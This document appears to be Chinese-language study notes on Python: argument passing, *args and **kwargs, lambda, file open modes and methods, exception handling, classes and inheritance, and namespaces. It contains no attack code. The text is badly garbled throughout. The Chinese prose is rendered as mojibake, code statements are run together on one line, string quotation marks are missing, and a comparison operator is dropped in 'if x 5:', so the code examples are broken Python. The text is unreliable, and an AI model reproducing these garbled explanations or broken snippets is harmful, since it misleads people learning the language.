å‡½æ•°çš„å‚æ•°ä¼ é€’ï¼š ä¸å¯å˜ç±»å‹ï¼šç±»ä¼¼ C++ çš„å€¼ä¼ é€’ï¼Œå¦‚æ•´æ•°ã€å­—ç¬¦ä¸²ã€å…ƒç»„ã€‚å¦‚ fun(a)ï¼Œä¼ é€’çš„åªæ˜¯ a çš„å€¼ï¼Œæ²¡æœ‰å½±å“ a å¯¹è±¡æœ¬èº«ã€‚å¦‚æœåœ¨ fun(a) å†…éƒ¨ä¿®æ”¹ a çš„å€¼ï¼Œåˆ™æ˜¯æ–°ç”Ÿæˆä¸€ä¸ª a çš„å¯¹è±¡ã€‚ def change(a): print(id(a)) # æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ a=10 print(id(a)) # ä¸€ä¸ªæ–°å¯¹è±¡a=1print(id(a))change(a)#åœ°å€å˜äº†print(a)#è¿™é‡Œçš„åœ°å€è¿˜æ˜¯åŸæ¥çš„åœ°å€ å¯å˜ç±»å‹ï¼šç±»ä¼¼ C++ çš„å¼•ç”¨ä¼ é€’ï¼Œå¦‚ åˆ—è¡¨ï¼Œå­—å…¸ã€‚å¦‚ fun(la)ï¼Œåˆ™æ˜¯å°† la çœŸæ­£çš„ä¼ è¿‡å»ï¼Œä¿®æ”¹å fun å¤–éƒ¨çš„ la ä¹Ÿä¼šå—å½±å“ python ä¸­ä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ï¼Œä¸¥æ ¼æ„ä¹‰æˆ‘ä»¬ä¸èƒ½è¯´å€¼ä¼ é€’è¿˜æ˜¯å¼•ç”¨ä¼ é€’ï¼Œæˆ‘ä»¬åº”è¯¥è¯´ä¼ ä¸å¯å˜å¯¹è±¡å’Œä¼ å¯å˜å¯¹è±¡ # å¯å†™å‡½æ•°è¯´æ˜def changeme( mylist ): ä¿®æ”¹ä¼ å…¥çš„åˆ—è¡¨ mylist.append([1,2,3,4]) print (å‡½æ•°å†…å–å€¼: , mylist) return# è°ƒç”¨changemeå‡½æ•°mylist = [10,20,30]changeme( mylist )print (å‡½æ•°å¤–å–å€¼: , mylist)//åœ°å€æ²¡æœ‰å˜ å…³é”®å­—å‚æ•°å’Œå‡½æ•°è°ƒç”¨å…³ç³»ç´§å¯†ï¼Œå‡½æ•°è°ƒç”¨ä½¿ç”¨å…³é”®å­—å‚æ•°æ¥ç¡®å®šä¼ å…¥çš„å‚æ•°å€¼ def printme( str ): æ‰“å°ä»»ä½•ä¼ å…¥çš„å­—ç¬¦ä¸² print (str) return printme( str = èœé¸Ÿæ•™ç¨‹) å¯èƒ½éœ€è¦ä¸€ä¸ªå‡½æ•°èƒ½å¤„ç†æ¯”å½“åˆå£°æ˜æ—¶æ›´å¤šçš„å‚æ•°ã€‚è¿™äº›å‚æ•°å«åšä¸å®šé•¿å‚æ•°ï¼Œå’Œä¸Šè¿° 2 ç§å‚æ•°ä¸åŒï¼Œå£°æ˜æ—¶ä¸ä¼šå‘½åã€‚åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š def functionname([formal_args,] *var_args_tuple ): å‡½æ•°_æ–‡æ¡£å­—ç¬¦ä¸² function_suite return [expression] åŠ äº†æ˜Ÿå· ***** çš„å‚æ•°ä¼šä»¥å…ƒç»„(tuple)çš„å½¢å¼å¯¼å…¥ï¼Œå­˜æ”¾æ‰€æœ‰æœªå‘½åçš„å˜é‡å‚æ•° def printinfo( arg1, *vartuple ): æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•° print (è¾“å‡º: ) print (arg1) print (vartuple)printinfo( 70, 60, 50 ) åŠ äº†ä¸¤ä¸ªæ˜Ÿå· ** çš„å‚æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼å¯¼å…¥ def printinfo( arg1, **vardict ): æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•° print (è¾“å‡º: ) print (arg1) print (vardict)printinfo(1, a=2,b=3) å¦‚æœå•ç‹¬å‡ºç°æ˜Ÿå· *****ï¼Œåˆ™æ˜Ÿå· ***** åçš„å‚æ•°å¿…é¡»ç”¨å…³é”®å­—ä¼ å…¥ lambda(åŒ¿åå‡½æ•°) ä½¿ç”¨ lambda æ¥åˆ›å»ºåŒ¿åå‡½æ•°ã€‚ lambda å‡½æ•°æ˜¯ä¸€ç§å°å‹ã€åŒ¿åçš„ã€å†…è”å‡½æ•°ï¼Œå®ƒå¯ä»¥å…·æœ‰ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ªè¡¨è¾¾å¼ã€‚ åŒ¿åå‡½æ•°ä¸éœ€è¦ä½¿ç”¨ def å…³é”®å­—å®šä¹‰å®Œæ•´å‡½æ•°ã€‚ lambda å‡½æ•°é€šå¸¸ç”¨äºç¼–å†™ç®€å•çš„ã€å•è¡Œçš„å‡½æ•°ï¼Œé€šå¸¸åœ¨éœ€è¦å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨ map()ã€filter()ã€reduce() ç­‰å‡½æ•°ä¸­ã€‚ lambda å‡½æ•°ç‰¹ç‚¹ï¼š lambda å‡½æ•°æ˜¯åŒ¿åçš„ï¼Œå®ƒä»¬æ²¡æœ‰å‡½æ•°åç§°ï¼Œåªèƒ½é€šè¿‡èµ‹å€¼ç»™å˜é‡æˆ–ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°æ¥ä½¿ç”¨ã€‚ lambda å‡½æ•°é€šå¸¸åªåŒ…å«ä¸€è¡Œä»£ç ï¼Œè¿™ä½¿å¾—å®ƒä»¬é€‚ç”¨äºç¼–å†™ç®€å•çš„å‡½æ•°ã€‚ lambda è¯­æ³•æ ¼å¼ï¼š lambda arguments: expression lambdaæ˜¯ Python çš„å…³é”®å­—ï¼Œç”¨äºå®šä¹‰ lambda å‡½æ•°ã€‚ arguments æ˜¯å‚æ•°åˆ—è¡¨ï¼Œå¯ä»¥åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå‚æ•°ï¼Œä½†å¿…é¡»åœ¨å†’å·(:)å‰æŒ‡å®šã€‚ expression æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œç”¨äºè®¡ç®—å¹¶è¿”å›å‡½æ•°çš„ç»“æœã€‚ f = lambda: Hello World!print(f()) lambda å‡½æ•°ä¹Ÿå¯ä»¥è®¾ç½®å¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä½¿ç”¨é€—å· , éš”å¼€ x = lambda a, b : a * bprint(x(5, 6)) é€šå¸¸ä¸å†…ç½®å‡½æ•°å¦‚ map()ã€filter() å’Œ reduce() ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿åœ¨é›†åˆä¸Šæ‰§è¡Œæ“ä½œ numbers = [1, 2, 3, 4, 5]squared = list(map(lambda x: x**2, numbers))print(squared) # è¾“å‡º: [1, 4, 9, 16, 25] Fileè¯»å†™æ–‡ä»¶ openå°†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼šopen(filename, mode)å¦‚æœè¯¥æ–‡ä»¶æ— æ³•è¢«æ‰“å¼€ï¼Œä¼šæŠ›å‡º OSError filenameï¼šåŒ…å«äº†ä½ è¦è®¿é—®çš„æ–‡ä»¶åç§°çš„å­—ç¬¦ä¸²å€¼ã€‚ modeï¼šå†³å®šäº†æ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ï¼šåªè¯»ï¼Œå†™å…¥ï¼Œè¿½åŠ ç­‰ã€‚æ‰€æœ‰å¯å–å€¼è§å¦‚ä¸‹çš„å®Œå…¨åˆ—è¡¨ã€‚è¿™ä¸ªå‚æ•°æ˜¯éå¼ºåˆ¶çš„ï¼Œé»˜è®¤æ–‡ä»¶è®¿é—®æ¨¡å¼ä¸ºåªè¯»(r)ã€‚ æ¨¡å¼ æè¿° r ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ rb ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ r+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ rb+ ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ w æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ wb ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ w+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ wb+ ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ a æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ ab ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ a+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ ab+ ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ æ–‡ä»¶å¯¹è±¡çš„æ–¹æ³• å‡è®¾å·²ç»åˆ›å»ºäº†ä¸€ä¸ªç§°ä¸º f çš„æ–‡ä»¶å¯¹è±¡,ä½¿ç”¨ä¸‹é¢é‚£äº›å‡½æ•°éƒ½éœ€è¦å…ˆæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼šf = open(/tmp/foo.txt, r) f.read() ä¸ºäº†è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œè°ƒç”¨ f.read(size), è¿™å°†è¯»å–ä¸€å®šæ•°ç›®çš„æ•°æ®, ç„¶åä½œä¸ºå­—ç¬¦ä¸²æˆ–å­—èŠ‚å¯¹è±¡è¿”å›ã€‚ size æ˜¯ä¸€ä¸ªå¯é€‰çš„æ•°å­—ç±»å‹çš„å‚æ•°ã€‚ å½“ size è¢«å¿½ç•¥äº†æˆ–è€…ä¸ºè´Ÿ, é‚£ä¹ˆè¯¥æ–‡ä»¶çš„æ‰€æœ‰å†…å®¹éƒ½å°†è¢«è¯»å–å¹¶ä¸”è¿”å› f.readline() ä¼šä»æ–‡ä»¶ä¸­è¯»å–å•ç‹¬çš„ä¸€è¡Œã€‚æ¢è¡Œç¬¦ä¸º â€˜ â€™ã€‚f.readline() å¦‚æœè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸², è¯´æ˜å·²ç»å·²ç»è¯»å–åˆ°æœ€åä¸€è¡Œ f.readlines() f.readlines() å°†è¿”å›è¯¥æ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰è¡Œã€‚å¦‚æœè®¾ç½®å¯é€‰å‚æ•° sizehint, åˆ™è¯»å–æŒ‡å®šé•¿åº¦çš„å­—èŠ‚, å¹¶ä¸”å°†è¿™äº›å­—èŠ‚æŒ‰è¡Œåˆ†å‰² f.write() f.write(string) å°† string å†™å…¥åˆ°æ–‡ä»¶ä¸­, ç„¶åè¿”å›å†™å…¥çš„å­—ç¬¦æ•° f = open(/tmp/foo.txt, w)num = f.write( Python æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„è¯­è¨€ã€‚ æ˜¯çš„ï¼Œçš„ç¡®éå¸¸å¥½!! )print(num)f.close() #è¾“å‡ºç»“æœä¸º29 å¦‚æœè¦å†™å…¥ä¸€äº›ä¸æ˜¯å­—ç¬¦ä¸²çš„ä¸œè¥¿, é‚£ä¹ˆå°†éœ€è¦å…ˆè¿›è¡Œè½¬æ¢ f = open(/tmp/foo1.txt, w)value = (www.runoob.com, 14)s = str(value)f.write(s)f.close() f.tell() f.tell() ç”¨äºè¿”å›æ–‡ä»¶å½“å‰çš„è¯»å†™ä½ç½®ï¼ˆå³æ–‡ä»¶æŒ‡é’ˆçš„ä½ç½®ï¼‰ã€‚æ–‡ä»¶æŒ‡é’ˆè¡¨ç¤ºä»æ–‡ä»¶å¼€å¤´å¼€å§‹çš„å­—èŠ‚æ•°åç§»é‡ã€‚f.tell() è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ–‡ä»¶æŒ‡é’ˆçš„å½“å‰ä½ç½® f.seek() å¦‚æœè¦æ”¹å˜æ–‡ä»¶æŒ‡é’ˆå½“å‰çš„ä½ç½®, å¯ä»¥ä½¿ç”¨ f.seek(offset, from_what) å‡½æ•°ã€‚ f.seek(offset, whence) ç”¨äºç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æŒ‡å®šä½ç½®ã€‚ offset è¡¨ç¤ºç›¸å¯¹äº whence å‚æ•°çš„åç§»é‡ï¼Œfrom_what çš„å€¼, å¦‚æœæ˜¯ 0 è¡¨ç¤ºå¼€å¤´, å¦‚æœæ˜¯ 1 è¡¨ç¤ºå½“å‰ä½ç½®, 2 è¡¨ç¤ºæ–‡ä»¶çš„ç»“å°¾ï¼Œä¾‹å¦‚ï¼š seek(x,0) ï¼š ä»èµ·å§‹ä½ç½®å³æ–‡ä»¶é¦–è¡Œé¦–å­—ç¬¦å¼€å§‹ç§»åŠ¨ x ä¸ªå­—ç¬¦ seek(x,1) ï¼š è¡¨ç¤ºä»å½“å‰ä½ç½®å¾€åç§»åŠ¨xä¸ªå­—ç¬¦ seek(-x,2)ï¼šè¡¨ç¤ºä»æ–‡ä»¶çš„ç»“å°¾å¾€å‰ç§»åŠ¨xä¸ªå­—ç¬¦ from_what å€¼ä¸ºé»˜è®¤ä¸º0ï¼Œå³æ–‡ä»¶å¼€å¤´ f.close() åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ (é‚£äº›æ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ä¸‹æ²¡æœ‰ b çš„), åªä¼šç›¸å¯¹äºæ–‡ä»¶èµ·å§‹ä½ç½®è¿›è¡Œå®šä½ã€‚ å½“ä½ å¤„ç†å®Œä¸€ä¸ªæ–‡ä»¶å, è°ƒç”¨ f.close() æ¥å…³é—­æ–‡ä»¶å¹¶é‡Šæ”¾ç³»ç»Ÿçš„èµ„æºï¼Œå¦‚æœå°è¯•å†è°ƒç”¨è¯¥æ–‡ä»¶ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ å½“å¤„ç†ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡æ—¶, ä½¿ç”¨ with å…³é”®å­—æ˜¯éå¸¸å¥½çš„æ–¹å¼ã€‚åœ¨ç»“æŸå, å®ƒä¼šå¸®ä½ æ­£ç¡®çš„å…³é—­æ–‡ä»¶ with open(/tmp/foo.txt, r) as f:... read_data = f.read() f.closedTrue å¼‚å¸¸å¤„ç†tryâ€¦except try è¯­å¥æŒ‰ç…§å¦‚ä¸‹æ–¹å¼å·¥ä½œï¼› é¦–å…ˆï¼Œæ‰§è¡Œ try å­å¥ï¼ˆåœ¨å…³é”®å­— try å’Œå…³é”®å­— except ä¹‹é—´çš„è¯­å¥ï¼‰ã€‚ å¦‚æœæ²¡æœ‰å¼‚å¸¸å‘ç”Ÿï¼Œå¿½ç•¥ except å­å¥ï¼Œtry å­å¥æ‰§è¡Œåç»“æŸã€‚ å¦‚æœåœ¨æ‰§è¡Œ try å­å¥çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆ try å­å¥ä½™ä¸‹çš„éƒ¨åˆ†å°†è¢«å¿½ç•¥ã€‚å¦‚æœå¼‚å¸¸çš„ç±»å‹å’Œ except ä¹‹åçš„åç§°ç›¸ç¬¦ï¼Œé‚£ä¹ˆå¯¹åº”çš„ except å­å¥å°†è¢«æ‰§è¡Œã€‚ å¦‚æœä¸€ä¸ªå¼‚å¸¸æ²¡æœ‰ä¸ä»»ä½•çš„ except åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸ªå¼‚å¸¸å°†ä¼šä¼ é€’ç»™ä¸Šå±‚çš„ try ä¸­ã€‚ ä¸€ä¸ª try è¯­å¥å¯èƒ½åŒ…å«å¤šä¸ªexceptå­å¥ï¼Œåˆ†åˆ«æ¥å¤„ç†ä¸åŒçš„ç‰¹å®šçš„å¼‚å¸¸ã€‚æœ€å¤šåªæœ‰ä¸€ä¸ªåˆ†æ”¯ä¼šè¢«æ‰§è¡Œã€‚ ä¸€ä¸ªexceptå­å¥å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªå¼‚å¸¸ï¼Œä¼šè¢«æ”¾åœ¨ä¸€ä¸ªæ‹¬å·é‡Œæˆä¸ºä¸€ä¸ªå…ƒç»„ï¼šexcept (RuntimeError, TypeError, NameError) æœ€åä¸€ä¸ªexceptå­å¥å¯ä»¥å¿½ç•¥å¼‚å¸¸çš„åç§°ï¼Œå®ƒå°†è¢«å½“ä½œé€šé…ç¬¦ä½¿ç”¨ except: tryâ€¦exceptâ€¦else è¯­å¥è¿˜æœ‰ä¸€ä¸ªå¯é€‰çš„ else å­å¥ï¼Œè¯¥å­å¥å¿…é¡»æ”¾åœ¨æ‰€æœ‰çš„ except å­å¥ä¹‹åã€‚elseå­å¥å°†åœ¨ try å­å¥æ²¡æœ‰å‘ç”Ÿä»»ä½•å¼‚å¸¸çš„æ—¶å€™æ‰§è¡Œ tryâ€¦finally æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸finally è¯­å¥éƒ½å°†æ‰§è¡Œæœ€åçš„ä»£ç ï¼Œfinallyè¯­å¥åœ¨elseçš„åé¢ æŠ›å‡ºå¼‚å¸¸ ä½¿ç”¨raiseè¯­å¥ï¼šraise [Exception [, args [, traceback]]] x = 10if x 5: raise Exception(x ä¸èƒ½å¤§äº 5ã€‚x çš„å€¼ä¸º: .format(x)) é¢„å®šä¹‰æ¸…ç†è¡Œä¸º ä¸€äº›å¯¹è±¡å®šä¹‰äº†æ ‡å‡†çš„æ¸…ç†è¡Œä¸ºï¼Œæ— è®ºç³»ç»Ÿæ˜¯å¦æˆåŠŸçš„ä½¿ç”¨äº†å®ƒï¼Œä¸€æ—¦ä¸éœ€è¦å®ƒäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªæ ‡å‡†çš„æ¸…ç†è¡Œä¸ºå°±ä¼šæ‰§è¡Œ å…³é”®è¯ with è¯­å¥å°±å¯ä»¥ä¿è¯è¯¸å¦‚æ–‡ä»¶ä¹‹ç±»çš„å¯¹è±¡åœ¨ä½¿ç”¨å®Œä¹‹åä¸€å®šä¼šæ­£ç¡®çš„æ‰§è¡Œä»–çš„æ¸…ç†æ–¹æ³• with open(myfile.txt) as f: for line in f: print(line, end=) ä»¥ä¸Šè¿™æ®µä»£ç æ‰§è¡Œå®Œæ¯•åï¼Œå°±ç®—åœ¨å¤„ç†è¿‡ç¨‹ä¸­å‡ºé—®é¢˜äº†ï¼Œæ–‡ä»¶ f æ€»æ˜¯ä¼šå…³é—­ å¯¹è±¡ç±»æœ‰ä¸€ä¸ªåä¸º init() çš„ç‰¹æ®Šæ–¹æ³•ï¼ˆæ„é€ æ–¹æ³•ï¼‰ï¼Œè¯¥æ–¹æ³•åœ¨ç±»å®ä¾‹åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ ç±»çš„æ–¹æ³• åœ¨ç±»çš„å†…éƒ¨ï¼Œä½¿ç”¨ def å…³é”®å­—æ¥å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œä¸ä¸€èˆ¬å‡½æ•°å®šä¹‰ä¸åŒï¼Œç±»æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•° self, ä¸”ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œself ä»£è¡¨å®ä¾‹ class people: name = age = 0 #å®šä¹‰ç§æœ‰å±æ€§,ç§æœ‰å±æ€§åœ¨ç±»å¤–éƒ¨æ— æ³•ç›´æ¥è¿›è¡Œè®¿é—® __weight = 0 def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w def speak(self): print(%s è¯´: æˆ‘ %d å²ã€‚ %(self.name,self.age))p = people(runoob,10,30)p.speak() ç±»çš„ç»§æ‰¿ å•ç»§æ‰¿ class DerivedClassName(BaseClassName):æˆ–è€… class DerivedClassName(modname.BaseClassName): class student(people): grade = def __init__(self,n,a,w,g): #è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° people.__init__(self,n,a,w) self.grade = g #è¦†å†™çˆ¶ç±»çš„æ–¹æ³• def speak(self): print(%s è¯´: æˆ‘ %d å²äº†ï¼Œæˆ‘åœ¨è¯» %d å¹´çº§%(self.name,self.age,self.grade)) å¤šç»§æ‰¿ å¤šç»§æ‰¿çš„ç±»å®šä¹‰ï¼šclass DerivedClassName(Base1, Base2, Base3)ï¼š éœ€è¦æ³¨æ„åœ†æ‹¬å·ä¸­çˆ¶ç±»çš„é¡ºåºï¼Œè‹¥æ˜¯çˆ¶ç±»ä¸­æœ‰ç›¸åŒçš„æ–¹æ³•åï¼Œè€Œåœ¨å­ç±»ä½¿ç”¨æ—¶æœªæŒ‡å®šï¼Œpythonä»å·¦è‡³å³æœç´¢ å³æ–¹æ³•åœ¨å­ç±»ä¸­æœªæ‰¾åˆ°æ—¶ï¼Œä»å·¦åˆ°å³æŸ¥æ‰¾çˆ¶ç±»ä¸­æ˜¯å¦åŒ…å«æ–¹æ³• ç±»çš„ç§æœ‰å±æ€§ __private_attrsï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥å±æ€§ä¸ºç§æœ‰ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è¢«ä½¿ç”¨æˆ–ç›´æ¥è®¿é—®ã€‚åœ¨ç±»å†…éƒ¨çš„æ–¹æ³•ä¸­ä½¿ç”¨æ—¶ self.__private_attrsã€‚ ç±»çš„ç§æœ‰æ–¹æ³• __private_methodï¼šä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥æ–¹æ³•ä¸ºç§æœ‰æ–¹æ³•ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨è°ƒç”¨ ï¼Œä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨è°ƒç”¨ã€‚self.__private_methodsã€‚ å‘½åç©ºé—´å‘½åç©ºé—´æä¾›äº†åœ¨é¡¹ç›®ä¸­é¿å…åå­—å†²çªçš„ä¸€ç§æ–¹æ³•ã€‚å„ä¸ªå‘½åç©ºé—´æ˜¯ç‹¬ç«‹çš„ï¼Œæ²¡æœ‰ä»»ä½•å…³ç³»çš„ï¼Œæ‰€ä»¥ä¸€ä¸ªå‘½åç©ºé—´ä¸­ä¸èƒ½æœ‰é‡åï¼Œä½†ä¸åŒçš„å‘½åç©ºé—´æ˜¯å¯ä»¥é‡åè€Œæ²¡æœ‰ä»»ä½•å½±å“ã€‚ æˆ‘ä»¬ä¸¾ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿä¸­çš„ä¾‹å­ï¼Œä¸€ä¸ªæ–‡ä»¶å¤¹(ç›®å½•)ä¸­å¯ä»¥åŒ…å«å¤šä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸­ä¸èƒ½æœ‰ç›¸åŒçš„æ–‡ä»¶åï¼Œä½†ä¸åŒæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å¯ä»¥é‡åã€‚ ä¸€èˆ¬æœ‰ä¸‰ç§å‘½åç©ºé—´ï¼š å†…ç½®åç§°ï¼ˆbuilt-in namesï¼‰ï¼Œ Python è¯­è¨€å†…ç½®çš„åç§°ï¼Œæ¯”å¦‚å‡½æ•°å absã€char å’Œå¼‚å¸¸åç§° BaseExceptionã€Exception ç­‰ç­‰ã€‚ å…¨å±€åç§°ï¼ˆglobal namesï¼‰ï¼Œæ¨¡å—ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†æ¨¡å—çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°ã€ç±»ã€å…¶å®ƒå¯¼å…¥çš„æ¨¡å—ã€æ¨¡å—çº§çš„å˜é‡å’Œå¸¸é‡ã€‚ å±€éƒ¨åç§°ï¼ˆlocal namesï¼‰ï¼Œå‡½æ•°ä¸­å®šä¹‰çš„åç§°ï¼Œè®°å½•äº†å‡½æ•°çš„å˜é‡ï¼ŒåŒ…æ‹¬å‡½æ•°çš„å‚æ•°å’Œå±€éƒ¨å®šä¹‰çš„å˜é‡ã€‚ï¼ˆç±»ä¸­å®šä¹‰çš„ä¹Ÿæ˜¯ï¼‰ å‡è®¾æˆ‘ä»¬è¦ä½¿ç”¨å˜é‡ runoobï¼Œåˆ™ Python çš„æŸ¥æ‰¾é¡ºåºä¸ºï¼šå±€éƒ¨çš„å‘½åç©ºé—´ - å…¨å±€å‘½åç©ºé—´ - å†…ç½®å‘½åç©ºé—´ global å’Œ nonlocal å…³é”®å­— 